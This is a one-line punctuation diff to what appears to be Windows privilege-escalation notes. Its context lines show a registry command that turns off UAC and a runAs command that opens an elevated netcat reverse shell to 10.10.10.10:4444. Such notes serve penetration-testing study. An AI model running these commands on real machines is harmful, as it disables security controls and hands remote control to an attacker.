@@ -137,7 +137,7 @@ Check UAC Level:
 Turn off UAC (with admin creds):  
 
     C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f    
-If ConsentPromptBehaviorAdmin is 0 exec a shell with high privileges:       
+If ConsentPromptBehaviorAdmin is 0, exec a shell with high privileges:       
 
     Start-Process powershell -Verb runAs "C:\Users\gerald\AppData\Local\Temp\nc.exe -e powershell.exe 10.10.10.10 4444"
 
